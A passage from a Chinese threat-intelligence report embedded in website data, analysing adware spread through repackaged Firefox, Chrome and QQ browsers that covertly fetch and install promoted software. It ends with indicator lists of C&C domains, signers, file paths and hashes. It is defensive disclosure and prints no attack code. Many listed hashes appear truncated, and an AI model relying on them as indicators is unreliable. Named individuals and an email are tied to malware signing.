class="footnote-backref">↩︎</a></p>\n</li>\n<li id="fn3" class="footnote-item"><p><a href="http://www.freebuf.com/articles/system/134017.html">http://www.freebuf.com/articles/system/134017.html</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>\n</li>\n</ol>\n</section>\n',category:"专题报告",__v:1,modify_time:"2017-08-01T08:02:52.105Z",abstract:"2017年6月9日，关于一款名为“暗云III”木马的信息在互联网传播，据称此木马具有隐蔽性强、潜在危害大、传播范围广等特点。木马主要通过外挂、游戏辅助、私服登录器等传播，此类软件通常诱导用户关闭安全软件后使用，使得木马得以乘机植入。木马主要通过云控进行任务发布，传播及执行恶意功能时无文件写入磁盘，同时木马所具有的bootkit能力也使得木马的运行更加隐而且难以查杀。本报告对木马的相关技术进行分析，并提供解决方法和检查确认建议。",readableId:"darkcloud3-botnet-technical-analysis",publish_time:"2017-06-14T15:27:52.000Z",descImg:"/uploads/2017/08/01/f8ac5e02af0e3da2ff7436f8250cd7a9.png",insert_time:"2017-07-25T12:03:51.378Z",isDraft:!1,tags:["DarkCloud","暗云3","暗云"]},{_id:"597733a71c670a09e493ee3b",title:"浏览器变造者流氓推广软件分析",author:"admin",content:'<h2 class="line" data-line="0">背景</h2>\n<p class="line" data-line="2">2017年6月1日，Checkpoint发布了文章<code>FIREBALL – The Chinese Malware of 250 Million Computers Infected</code>，涉及一款被其命名为FireBall的流氓软件，声称在全球感染了近2亿5千万的机器。报告认为这次感染事件的源头是一家注册于中国北京的名为Rafotech的科技公司，其使用Fireball软件修改用户的Chrome浏览器的默认搜索引擎，将用户的默认搜索指向该公司自己的搜索页面并将用户的查询重定向到yahoo.com或者google.com的页面。这个转向搜索页面可能会用来收集用户的个人信息，此外，报告中认为Fireball有可能被用来下载更多的木马程序。</p>\n<p class="line" data-line="4">360威胁情报中心对Checkpoint所发布内容进行了跟踪及信息收集检视，确认了一些存在于相关相关厂商通过共享软件进行流氓推广的行为，涉及的共享软件包括Deal WiFi、SOSO DESK桌面软件、HolaInput 输入法软件、FVP Imageviewer 软件、Mustang Borwer 软件等。初始的报告详见《Fireball流氓推广软件分析》。</p>\n<p class="line" data-line="6">在初始报告发布以后，更进一步挖掘让我们发现了更多的影响面更大的流氓推广手法：通过变造流行的浏览器程序，利用其进行流氓推广，在用户系统上安装不必要的软件，甚至可能执行恶意代码，我们将其称为”浏览器变造者”活动，以下为相关的细节。</p>\n<h2 class="line" data-line="8">技术细节</h2>\n<p class="line" data-line="10">Checkpoint报告中提到了野马浏览器，其基于Chrome浏览器开发，带有正常的数字签名。野马浏览器在安装完成后，会将自身注册成系统服务，以达到开机自启动的目的。软件在安装时并不会要求修改用户的Chrome浏览器首页，自带的两个浏览器扩展:Block ads扩展和VPN扩展都不存在恶意行为。</p>\n<p class="text-center line" data-line="12"><img src="/uploads/2017/07/25/66875354540ef9e8b9b55e5e367ca896.png" alt=""></p>\n<p class="line" data-line="14">野马浏览器的更新功能代码在MusUpdate.dll中，MusServer.exe通过MusUpdate.dll的导出函数CreateUpdateManager访问http://mustang.rafoservice.com/update.php来下载新版本的浏览器程序。”-c”为chrome浏览器插件功能安装，”-update”为程序的更新功能。</p>\n<p class="text-center line" data-line="16"><img src="/uploads/2017/07/25/17c9ea35e440d7fac004663d4ddee405.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="18"><img src="/uploads/2017/07/25/6e4de58b4e7662c598816a70ea1839bb.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="21"><img src="/uploads/2017/07/25/ef510127e8c9d5011629ca7508d0d586.png" alt="" width="90%"></p>\n<p class="line" data-line="24">通过分析野马浏览器中包含的软件更新代码是软件正常的升级代码，虽然代码有被用来下载恶意代码的可能，但是目前还未发现直接的证据。</p>\n<p class="line" data-line="26">查询360威胁情报中心，mustang-browser.com域名的注册人信息为：</p>\n<p class="text-center line" data-line="28"><img src="/uploads/2017/07/25/49b06aebeef22e27ac85e73258427541.png" alt="" width="90%"></p>\n<p class="line" data-line="31">所使用的注册邮箱为 baoyu430@gmail.com，此邮箱注册的域名有如下这些：</p>\n<ul>\n<li>firefox1.org</li>\n<li>firefox6.net</li>\n<li>firefox1.net</li>\n<li>firefox1.com</li>\n<li>firefox6.com</li>\n<li>pagesnotfound.com</li>\n<li>brobgser.com</li>\n<li>neterrors.com</li>\n<li>answerscome.com</li>\n<li>yulinkeji.xyz</li>\n<li>sbgpnfejb.xyz</li>\n<li>bysenda.com</li>\n<li>deskick.com</li>\n<li>mustang-browser.com</li>\n<li>ghokswa.com</li>\n<li>dealwifi.com</li>\n<li>rafotech.com-</li>\n</ul>\n<p class="line" data-line="51">对这些域名的访问来源样本进行搜索，我们发现大量灰样本对于firefox1.com域名的异常访问，对那些样本进行分析确认是流氓推广程序，但这些软件基本都带有正常的数字签名信息。部分样本的数字签名如下图，已知的完整数字签名信息列表位于IOC一节中。</p>\n<p class="text-center line" data-line="53"><img src="/uploads/2017/07/25/4af4a63dd7d8fdacb63117affe010c3a.png" alt="" width="90%"></p>\n<p class="line" data-line="55">基于以上的分析，我们基本确认流氓软件通过重新打包签名常用的浏览器进行传播，将更新组件替换成自身或加入自己控制的组件以实现流氓推广的能力。目前发现的被变造的浏览器软件主要有：Firefox、Chrome、QQ浏览器。</p>\n<p class="line" data-line="57">各被变造后的浏览器中包含的连接C&amp;C服务器的组件主要文件名如下：</p>\n<table>\n<thead>\n<tr>\n<th><strong>浏览器</strong></th>\n<th><strong>文件名</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>QQ浏览器</td>\n<td>qqbrowserframe.dll</td>\n</tr>\n<tr>\n<td>Chrome</td>\n<td>chrome.dll</td>\n</tr>\n<tr>\n<td>Firefox</td>\n<td>firefoxum.exe</td>\n</tr>\n<tr>\n<td>Firefox</td>\n<td>firefoxupdate.exe</td>\n</tr>\n<tr>\n<td>Firefox</td>\n<td>firefox.exe</td>\n</tr>\n<tr>\n<td>Firefox</td>\n<td>firefoxum.exe</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>组件所下载的其他程序</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>cloud.dll</td>\n</tr>\n<tr>\n<td>firefoxupdate.exe</td>\n</tr>\n<tr>\n<td>xul.dll</td>\n</tr>\n<tr>\n<td>d_box.exe</td>\n</tr>\n<tr>\n<td>d_box.dll</td>\n</tr>\n<tr>\n<td>archerbox.dll</td>\n</tr>\n<tr>\n<td>firefox.exe</td>\n</tr>\n<tr>\n<td>ssfk.exe</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="79">以下是被重新打包过的Firefox浏览器的例子：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>文件名</strong></td>\n<td>firefox.exe</td>\n</tr>\n<tr>\n<td><strong>MD5</strong></td>\n<td>a00cba897a087f7b7d9814d1d79a993e</td>\n</tr>\n<tr>\n<td><strong>数字签名</strong></td>\n<td>Mengmeng Wang</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="87">下图左边为被修改的firefox和官网下载的firefox.exe的对比：</p>\n<p class="text-center line" data-line="89"><img src="/uploads/2017/07/25/3d2c984afa265c2534080bef70ed1521.png" alt="" width="90%"></p>\n<p class="line" data-line="91">除此之外，还有多个模块，用以完成不同的功能：</p>\n<table>\n<thead>\n<tr>\n<th><strong>文件名</strong></th>\n<th><strong>MD5</strong></th>\n<th><strong>数字签名</strong></th>\n<th><strong>备注</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>FirefoxUM.exe</td>\n<td>33f947f63a936498897b65362a9c04e4</td>\n<td>Yongli Zhang</td>\n<td>更新模块</td>\n</tr>\n<tr>\n<td>FirefoxCommand.exe</td>\n<td>540449a36140ff21a7d1caaf01d8a46f</td>\n<td>Yongli Zhang</td>\n<td>执行命令</td>\n</tr>\n<tr>\n<td>Firefox_crashreporter.exe</td>\n<td>e44d9a66fb54e3b241fc0da4c14fd4a5</td>\n<td>Yongli Zhang</td>\n<td>注入</td>\n</tr>\n<tr>\n<td>FirefoxCloud.exe</td>\n<td>e0f8177a795c2132422d61cc9e531df4</td>\n<td>Yongli Zhang</td>\n<td>云控模块</td>\n</tr>\n<tr>\n<td>FirefoxInstatller.exe</td>\n<td>aaf1f8b888a9ae3c9bc29bcca84fe614</td>\n<td>Yongli Zhang</td>\n<td>安装包(已失效)</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="101">值得注意的是，这些样本的代码和上面提到过的野马浏览器代码有不少相似的地方，例如FirefoxUM.exe样本中解析http返回数据的代码片断和设置调试信息的代码片段，下图左边是FirefoxUM.exe的代码，右边是野马浏览器MusUpdate.dll的代码：</p>\n<p class="text-center line" data-line="103"><img src="/uploads/2017/07/25/3afd427fc997677a5fd73aeef5134e9a.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="105"><img src="/uploads/2017/07/25/83fe769dc8ac6bb8824cefbf9304b03a.png" alt="" width="90%"></p>\n<p class="line" data-line="107">变造过的浏览器安装完成后，会在后台下载其他组件，再由组件去偷偷下载推广软件，下载推广部分组件的代码如下：可以看到其在请求推广软件的下载地址时，HTTP包头的User-Agent的值被设置为“SAM_Updater”：</p>\n<p class="text-center line" data-line="109"><img src="/uploads/2017/07/25/88c7b01c308bc366144b3a99bd49a870.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="111"><img src="/uploads/2017/07/25/681193f8b85c461b42ac1eb300cbfee5.png" alt="" width="90%"></p>\n<p class="line" data-line="113">下载完成后，如果软件的扩展名为”.msi”，就通过ShellExecuteExW调用推广程序进行安装操作。</p>\n<p class="text-center line" data-line="115"><img src="/uploads/2017/07/25/5603007763db841dd6609873576fe83f.png" alt="" width="90%"></p>\n<p class="line" data-line="117">如果下载的软件的扩展名为“.exe”， 就通过CreateProcessW调用推广程序进行安装操作。</p>\n<p class="text-center line" data-line="119"><img src="/uploads/2017/07/25/f05c3779b0e3c39e8aa5c0807ec215cc.png" alt="" width="90%"></p>\n<p class="line" data-line="121">又比如jixmrfr_server.exe（d87df33939c2e7964a8d0b15d16b99e5）这个样本，根据不同的命令行参数有不同的功能，下面是设置默认浏览器的部分：</p>\n<p class="text-center line" data-line="123"><img src="/uploads/2017/07/25/9693309df297f3ebca1cd0fdf25c5bec.png" alt="" width="90%"></p>\n<p class="line" data-line="125">除了已知的firefox1.com C&amp;C域名，360威胁情报中心通过多维度的关联分析还确认了其他若干C&amp;C服务器，完整列表请参看IOC节的C&amp;C服务器域名列表。</p>\n<h2 class="line" data-line="127">国内影响面评估</h2>\n<p class="line" data-line="129">基于360网络研究院的DNS解析数据，我们观察到的几个主要C&amp;C服务器最早观察到时间如下，可以看到本次事件相关的活动最早可以追溯到2016年2月：</p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>cloud.chromlum.info</td>\n<td>2016/4/18</td>\n</tr>\n<tr>\n<td>cloud.firefox1.com</td>\n<td>2016/6/28</td>\n</tr>\n<tr>\n<td>cs.chromlum.info</td>\n<td>2016/9/12</td>\n</tr>\n<tr>\n<td>img.chromlum.info</td>\n<td>2016/4/21</td>\n</tr>\n<tr>\n<td>xa.firefox1.com</td>\n<td>2016/6/28</td>\n</tr>\n<tr>\n<td>xa.qihuweb.com</td>\n<td>2016/2/27</td>\n</tr>\n<tr>\n<td>clouda.firefox1.com</td>\n<td>2016/6/30</td>\n</tr>\n<tr>\n<td>test.thewebanswers.com</td>\n<td>2016/3/23</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="144">近一年的访问量曲线如下：</p>\n<p class="text-center line" data-line="146"><img src="/uploads/2017/07/25/3499f7fd0ac5426e08b48bc1337c5630.png" alt="C:\\Users\\WANGLI~1.INT\\AppData\\Roaming\\lanxin_se\\pictures\\snp20170606124453589.png" width="90%"></p>\n<p class="line" data-line="148">从流量曲线来看，此流氓推广在2016年5月、10月及2107年4月分别达到过3次高峰。基于对数据的抽样统计分析，360威胁情报中心初步评估国内用户的总感染量在10万量级。</p>\n<h2 class="line" data-line="150">总结</h2>\n<p class="line" data-line="152">本次对源自Checkpoint公开报告的FireBall恶意代码的活动进行了跟踪分析，从目前的分析结果来看这是影响面很广的基于流氓推广盈利的灰产活动，事件背后的团伙注册了多个公司，大量使用合法数字签名，行为游走于合法与非法之间，从错综复杂的流氓活动相关恶意代码来看我们所发现的活动可能只是一个巨大推广联盟的一部分，如果继续深入挖掘必定还会有更多发现。</p>\n<p class="line" data-line="154">恶意代码对用户的直接影响是可能导致用户敏感信息的泄露，机器上被安装无用的垃圾软件，虽然技术上可以对安装了流氓软件的用户系统施加控制执行更加恶意的任务，但还未发现切实的证据。</p>\n<h2 class="line" data-line="156">IOC</h2>\n<table>\n<thead>\n<tr>\n<th><strong>事件相关恶意代码的数字签名</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Beijing Baijianqi Touzi Guanli Youxiangongsi</td>\n</tr>\n<tr>\n<td>Beijing Caiyunshidai Technology Co.</td>\n</tr>\n<tr>\n<td>Beijing Xingyunwang Technology Co.</td>\n</tr>\n<tr>\n<td>Beijing Xingyunwang Technology Co., Ltd</td>\n</tr>\n<tr>\n<td>Chao Wei</td>\n</tr>\n<tr>\n<td>Dening Hu</td>\n</tr>\n<tr>\n<td>EVANGEL TECHNOLOGY (HK) LIMITED</td>\n</tr>\n<tr>\n<td>Fuyuan Zhou</td>\n</tr>\n<tr>\n<td>Hongkong zoekyu Technology Limited</td>\n</tr>\n<tr>\n<td>Jiang Liu</td>\n</tr>\n<tr>\n<td>Jinnan Wu</td>\n</tr>\n<tr>\n<td>Luhong Han</td>\n</tr>\n<tr>\n<td>Mengmeng Wang</td>\n</tr>\n<tr>\n<td>Nayun Online Network Technology (Shenzhen) Co.</td>\n</tr>\n<tr>\n<td>RAFO TECHNOLOGY INC</td>\n</tr>\n<tr>\n<td>RAFO TECHNOLOGY INC.</td>\n</tr>\n<tr>\n<td>Shan Feng</td>\n</tr>\n<tr>\n<td>Shanghai Yuntong Technology Co.</td>\n</tr>\n<tr>\n<td>Shanghai Yuntong Technology Co., Ltd.</td>\n</tr>\n<tr>\n<td>Shulan Hou</td>\n</tr>\n<tr>\n<td>Sice Xing</td>\n</tr>\n<tr>\n<td>Sivi Technology Limited</td>\n</tr>\n<tr>\n<td>Tianjing Cheng</td>\n</tr>\n<tr>\n<td>Wei Liu</td>\n</tr>\n<tr>\n<td>Wenchao Zhang</td>\n</tr>\n<tr>\n<td>Yanling Sun</td>\n</tr>\n<tr>\n<td>Yongli Li</td>\n</tr>\n<tr>\n<td>Yongli Zhang</td>\n</tr>\n<tr>\n<td>Yuanyuan Zhang</td>\n</tr>\n<tr>\n<td>Yupeng Zhang</td>\n</tr>\n<tr>\n<td>Zhiming Yuan</td>\n</tr>\n<tr>\n<td>Zhixiong Zhao</td>\n</tr>\n<tr>\n<td>上海云瞳科技有限公司</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>部分流氓推广程序的PDB路径</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>c:\\workspace\\3461B02E-043F-4C21-9CBF-35459A4CB3FB\\src\\obj-i686-</td>\n</tr>\n<tr>\n<td>\\browser\\app\\Firefox.pdb</td>\n</tr>\n<tr>\n<td>C:\\workspace\\1AF43C64-354F-44FD-92C8-1907803EACCC\\out\\Release</td>\n</tr>\n<tr>\n<td>C:\\firefox\\installer\\out\\Release\\mem_load_dll.pdb</td>\n</tr>\n<tr>\n<td>D:\\ggg\\server_lyl\\SvrUpdater1(TargetName).pdb</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>流氓软件文件名</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>%userprofile%\\appdata\\local\\temp[random]\\qqbrowserframe.dll</td>\n</tr>\n<tr>\n<td>\\program files[%random%]\\cloud.dll</td>\n</tr>\n<tr>\n<td>%userprofile%\\appdata\\local\\chromium\\application\\chrome.exe</td>\n</tr>\n<tr>\n<td>\\program files[%random%]\\application\\chrome.dll</td>\n</tr>\n<tr>\n<td>\\program files\\firefox\\bin\\firefoxum.exe</td>\n</tr>\n<tr>\n<td>\\program files\\firefox\\bin\\firefoxupdate.exe</td>\n</tr>\n<tr>\n<td>\\program files\\firefox\\firefox.exe</td>\n</tr>\n<tr>\n<td>\\program</td>\n</tr>\n<tr>\n<td>\\program</td>\n</tr>\n<tr>\n<td>\\windows\\temp\\d_box.dll</td>\n</tr>\n<tr>\n<td>update.dll-201705101704.dll.exe</td>\n</tr>\n<tr>\n<td>update.dll-201705151544.dll.exe</td>\n</tr>\n<tr>\n<td>d_box.exe</td>\n</tr>\n<tr>\n<td>archerbox.dll</td>\n</tr>\n<tr>\n<td>~ms13fe.tmp.dat</td>\n</tr>\n<tr>\n<td>~ms14a0.tmp.dat</td>\n</tr>\n<tr>\n<td>~ms1558.tmp.dat</td>\n</tr>\n<tr>\n<td>~ms19cf.tmp.dat</td>\n</tr>\n<tr>\n<td>~ms1a45.tmp.dat</td>\n</tr>\n<tr>\n<td>\\windows\\temp~ms1a4d.tmp.dat</td>\n</tr>\n<tr>\n<td>\\windows\\temp~ms1c99.tmp.dat</td>\n</tr>\n<tr>\n<td>\\windows\\temp~ms1dbc.tmp.dat</td>\n</tr>\n<tr>\n<td>c:~ms3661.tmp.dat</td>\n</tr>\n<tr>\n<td>e:\\firefox\\firefox.exe</td>\n</tr>\n<tr>\n<td>\\windows\\fhelper.exe</td>\n</tr>\n<tr>\n<td>\\program+files\\ssfk.exe</td>\n</tr>\n<tr>\n<td>\\program+files\\sfk\\ssfk.exe</td>\n</tr>\n<tr>\n<td>qqbrowserframe.dll</td>\n</tr>\n<tr>\n<td>cloud.dll</td>\n</tr>\n<tr>\n<td>chrome.dll</td>\n</tr>\n<tr>\n<td>firefoxum.exe</td>\n</tr>\n<tr>\n<td>firefoxupdate.exe</td>\n</tr>\n<tr>\n<td>xul.dll</td>\n</tr>\n<tr>\n<td>fujitsuxmhz2080bhxg2_k60fta22fpg6ta22fpg6x.exe</td>\n</tr>\n<tr>\n<td>st1000dm003-1ch162_s1dhdcxhxxxxs1dhdcxh.dat</td>\n</tr>\n<tr>\n<td>d_box.dll</td>\n</tr>\n<tr>\n<td>update.dll-201705101704.dll.exe</td>\n</tr>\n<tr>\n<td>update.dll-201705151544.dll.exe</td>\n</tr>\n<tr>\n<td>update.dll-201705051847.dll.exe</td>\n</tr>\n<tr>\n<td>update.dll-201705181724.dll.exe</td>\n</tr>\n<tr>\n<td>d_box.exe</td>\n</tr>\n<tr>\n<td>archerbox.dll</td>\n</tr>\n<tr>\n<td>~ms13fe.tmp.dat</td>\n</tr>\n<tr>\n<td>~ms14a0.tmp.dat</td>\n</tr>\n<tr>\n<td>~ms1558.tmp.dat</td>\n</tr>\n<tr>\n<td>~ms19cf.tmp.dat</td>\n</tr>\n<tr>\n<td>~ms1a45.tmp.dat</td>\n</tr>\n<tr>\n<td>firefox.exe</td>\n</tr>\n<tr>\n<td>ssfk.exe</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>流氓推广的HTTP包特征：</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>User-Agent：</td>\n</tr>\n<tr>\n<td>SAM_Updater</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>流氓推广的搜索主页列表</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>https://mystart.dealwifi.com/</td>\n</tr>\n<tr>\n<td>http://search.ozipcompression.com/</td>\n</tr>\n<tr>\n<td>http://start.siviewer.com</td>\n</tr>\n<tr>\n<td>http://search.sosodesktop.com</td>\n</tr>\n<tr>\n<td>http://search.fvpimageviewer.com</td>\n</tr>\n<tr>\n<td>http://search.holainput.com</td>\n</tr>\n<tr>\n<td>http://attirerpage.com</td>\n</tr>\n<tr>\n<td>http://s2s.rafotech.com</td>\n</tr>\n<tr>\n<td>http://trotux.com</td>\n</tr>\n<tr>\n<td>http://startpageing123.com</td>\n</tr>\n<tr>\n<td>http://funcionapage.com</td>\n</tr>\n<tr>\n<td>http://universalsearches.com</td>\n</tr>\n<tr>\n<td>http://thewebanswers.com</td>\n</tr>\n<tr>\n<td>http://nicesearches.com</td>\n</tr>\n<tr>\n<td>http://youndoo.com</td>\n</tr>\n<tr>\n<td>http://giqepofa.com</td>\n</tr>\n<tr>\n<td>http://mustang-browser.com</td>\n</tr>\n<tr>\n<td>http://forestbrowser.com</td>\n</tr>\n<tr>\n<td>http://luckysearch123.com</td>\n</tr>\n<tr>\n<td>http://ooxxsearch.com</td>\n</tr>\n<tr>\n<td>http://search2000s.com</td>\n</tr>\n<tr>\n<td>http://walasearch.com</td>\n</tr>\n<tr>\n<td>http://hohosearch.com</td>\n</tr>\n<tr>\n<td>http://yessearches.com</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>流氓推广关联的CC地址</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bugreportdmp.chromlum.net</td>\n</tr>\n<tr>\n<td>bugreportdmp.chromlum.org</td>\n</tr>\n<tr>\n<td>cl.qbitka.com</td>\n</tr>\n<tr>\n<td>cloud.chr0me.net</td>\n</tr>\n<tr>\n<td>cloud.chr0mium.com</td>\n</tr>\n<tr>\n<td>cloud.chrom1um.com</td>\n</tr>\n<tr>\n<td>cloud.chromeinform.net</td>\n</tr>\n<tr>\n<td>cloud.chromlum.com</td>\n</tr>\n<tr>\n<td>cloud.chromlum.net</td>\n</tr>\n<tr>\n<td>cloud.chromlum.org</td>\n</tr>\n<tr>\n<td>cloud.ffgogogo.com</td>\n</tr>\n<tr>\n<td>clouda.chr0me.net</td>\n</tr>\n<tr>\n<td>clouda.chr0mium.com</td>\n</tr>\n<tr>\n<td>clouda.chrom1um.com</td>\n</tr>\n<tr>\n<td>clouda.chromeinform.net</td>\n</tr>\n<tr>\n<td>clouda.chromlum.net</td>\n</tr>\n<tr>\n<td>clouda.chromlum.org</td>\n</tr>\n<tr>\n<td>clouda.ffgogogo.com</td>\n</tr>\n<tr>\n<td>cs.chromeinform.net</td>\n</tr>\n<tr>\n<td>cs.chromlum.net</td>\n</tr>\n<tr>\n<td>cs.chromlum.org</td>\n</tr>\n<tr>\n<td>d.palorush.com</td>\n</tr>\n<tr>\n<td>home.ozipcompression.com</td>\n</tr>\n<tr>\n<td>home.sosodesktop.com</td>\n</tr>\n<tr>\n<td>iminentsearch.com</td>\n</tr>\n<tr>\n<td>isp.aojaso.com</td>\n</tr>\n<tr>\n<td>nav.dozensearch.com</td>\n</tr>\n<tr>\n<td>offers.nuesearch.com</td>\n</tr>\n<tr>\n<td>service.chr0mium.com</td>\n</tr>\n<tr>\n<td>service.chromlum.org</td>\n</tr>\n<tr>\n<td>ozipcompression.com</td>\n</tr>\n<tr>\n<td>service.ffgogogo.com</td>\n</tr>\n<tr>\n<td>test.thewebanswers.com</td>\n</tr>\n<tr>\n<td>tj01.thewebanswers.com</td>\n</tr>\n<tr>\n<td>xa.amisites.com</td>\n</tr>\n<tr>\n<td>xa.attirerpage.com</td>\n</tr>\n<tr>\n<td>xa.chr0mium.com</td>\n</tr>\n<tr>\n<td>xa.chrom1um.com</td>\n</tr>\n<tr>\n<td>xa.chromlum.net</td>\n</tr>\n<tr>\n<td>xa.chromlum.org</td>\n</tr>\n<tr>\n<td>xa.dozensearch.com</td>\n</tr>\n<tr>\n<td>xa.ffgogogo.com</td>\n</tr>\n<tr>\n<td>xa.iminentsearch.com</td>\n</tr>\n<tr>\n<td>xa.nicesearches.com</td>\n</tr>\n<tr>\n<td>xa.nuesearch.com</td>\n</tr>\n<tr>\n<td>xa.searchvvay.com</td>\n</tr>\n<tr>\n<td>xa.xaupdatecloud.com</td>\n</tr>\n<tr>\n<td>xa.xayescloud.com</td>\n</tr>\n<tr>\n<td>xa.yessearches.com</td>\n</tr>\n<tr>\n<td>xa.yoursearchweb.com</td>\n</tr>\n<tr>\n<td>service.browserinfo.org</td>\n</tr>\n<tr>\n<td>cloud.chromlum.info</td>\n</tr>\n<tr>\n<td>cloud.firefox1.com</td>\n</tr>\n<tr>\n<td>cs.chromlum.info</td>\n</tr>\n<tr>\n<td>img.chromlum.info</td>\n</tr>\n<tr>\n<td>xa.firefox1.com</td>\n</tr>\n<tr>\n<td>xa.qihuweb.com</td>\n</tr>\n<tr>\n<td>clouda.firefox1.com</td>\n</tr>\n<tr>\n<td>browsersecurity.info</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>流氓推广的文件HASH</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0a61fc195b8caa034448482</td>\n</tr>\n<tr>\n<td>4ed87cabf0526ae8ae5476ab</td>\n</tr>\n<tr>\n<td>455fb83a7b0e5bdc5a011ba</td>\n</tr>\n<tr>\n<td>855b7e738f205f9025da9af0</td>\n</tr>\n<tr>\n<td>898724f6ee22f1bb60bfe1a</td>\n</tr>\n<tr>\n<td>8800565e61cbc83dd55821f</td>\n</tr>\n<tr>\n<td>7688a16a15ed43d4f668d1a</td>\n</tr>\n<tr>\n<td>1f17e07ffdb3609921a609a</td>\n</tr>\n<tr>\n<td>9c25f1a08780407764242104</td>\n</tr>\n<tr>\n<td>9a0e900b46ee1e7b02d1d0ab</td>\n</tr>\n<tr>\n<td>bc6504bc956eb3156388118</td>\n</tr>\n<tr>\n<td>db4370c8b370ccc4bfc074d</td>\n</tr>\n<tr>\n<td>ff6f897e27f6ac71354d354</td>\n</tr>\n<tr>\n<td>dea75ffdaf639b930752c47</td>\n</tr>\n<tr>\n<td>f5ced9f75a92f4db88c28a5</td>\n</tr>\n<tr>\n<td>64e1ccc864757269a639bd6</td>\n</tr>\n<tr>\n<td>a1c39d19e532cf147b06655</td>\n</tr>\n<tr>\n<td>2c6ffd73f0de10b9f5b70b7</td>\n</tr>\n<tr>\n<td>409eedc0e0a86f6bf265f34</td>\n</tr>\n<tr>\n<td>66e1499501d8890a13faa40</td>\n</tr>\n<tr>\n<td>943795651a49e5f224f0c3c</td>\n</tr>\n<tr>\n<td>06a4a88402190cd8bf436f8b</td>\n</tr>\n<tr>\n<td>73f3198ce318e85eb424f3ad</td>\n</tr>\n<tr>\n<td>42b51cf9d7d7dc4e98a45c8</td>\n</tr>\n<tr>\n<td>015438ab81f45a3985dc3a2</td>\n</tr>\n<tr>\n<td>775fdc0c9fc59a634ef8d38</td>\n</tr>\n<tr>\n<td>b90315a62f8bf75173e54d7</td>\n</tr>\n<tr>\n<td>cf0365127751d172fb2d262</td>\n</tr>\n<tr>\n<td>82bdf83064d7f968ccd259c</td>\n</tr>\n<tr>\n<td>d05d1f9e8f0a92728b01c490</td>\n</tr>\n<tr>\n<td>d7fa15750bf4b6a8581e9ef</td>\n</tr>\n<tr>\n<td>2334a50ac6e176b3925a31d0</td>\n</tr>\n<tr>\n<td>18a9e3280393f85529a0dafa</td>\n</tr>\n<tr>\n<td>5e11968bcd24b3d422b4a7e</td>\n</tr>\n<tr>\n<td>7aa9a22892fd28f983cd968d</td>\n</tr>\n<tr>\n<td>5cdef233b09fb63b72019586</td>\n</tr>\n<tr>\n<td>8502bab659375f3c59c5990</td>\n</tr>\n<tr>\n<td>5f2ec72b592e1f6abbc80d80</td>\n</tr>\n<tr>\n<td>f9bc973ecd0f56e080c344d</td>\n</tr>\n<tr>\n<td>0c204cf6c887561baa98c26</td>\n</tr>\n<tr>\n<td>fc320b8e35bded495824274</td>\n</tr>\n<tr>\n<td>8ef3f0df98680731667fc49</td>\n</tr>\n<tr>\n<td>816e0797c0ec3b9c1fe33e7</td>\n</tr>\n<tr>\n<td>6a50c19ef95516f48df00951</td>\n</tr>\n<tr>\n<td>bf04cfaf614591c5cd1148b</td>\n</tr>\n<tr>\n<td>17d76b01ff8180a8c26df5a</td>\n</tr>\n<tr>\n<td>62107e2738e29cb0854a0c</td>\n</tr>\n<tr>\n<td>e2e447e038d1a38c3c9c1f0</td>\n</tr>\n<tr>\n<td>21e7c22579158a203959fc6</td>\n</tr>\n<tr>\n<td>9a178acd1743adefff55c0d</td>\n</tr>\n<tr>\n<td>d29b584259888489c4dd4fc2</td>\n</tr>\n<tr>\n<td>60035bcd28ba55a67a79d86</td>\n</tr>\n<tr>\n<td>0be85281b569e39470535ce</td>\n</tr>\n<tr>\n<td>aebfd333891870405677bc9</td>\n</tr>\n<tr>\n<td>d8c4dfdf9b3baf05e2b3d22</td>\n</tr>\n<tr>\n<td>b346aafc9e40d726913fee3</td>\n</tr>\n<tr>\n<td>d2cbdd7f1994fc01b6e94b8</td>\n</tr>\n<tr>\n<td>6883c17bb792ca55fb15f3e</td>\n</tr>\n<tr>\n<td>3ac0af6e1e28a4777067aeb</td>\n</tr>\n<tr>\n<td>428ba4e3660b6634ce4f3930</td>\n</tr>\n<tr>\n<td>6c34925850b02fb69e90d21</td>\n</tr>\n<tr>\n<td>9bc9bda2cc60062e99a7a2f2</td>\n</tr>\n<tr>\n<td>1af1dc42cc9898034eaebfa3</td>\n</tr>\n<tr>\n<td>fa1fb7a9e54ce4382dbdb50</td>\n</tr>\n<tr>\n<td>da4f62ff75d2b6234e2d3bd6</td>\n</tr>\n<tr>\n<td>75629245594031c418769077</td>\n</tr>\n<tr>\n<td>edb5d40db2efe2afc0e5c94</td>\n</tr>\n<tr>\n<td>a5ef89235ef13041e4f8408</td>\n</tr>\n<tr>\n<td>9a962bc8f9f0621f0dbf34f1</td>\n</tr>\n<tr>\n<td>4c7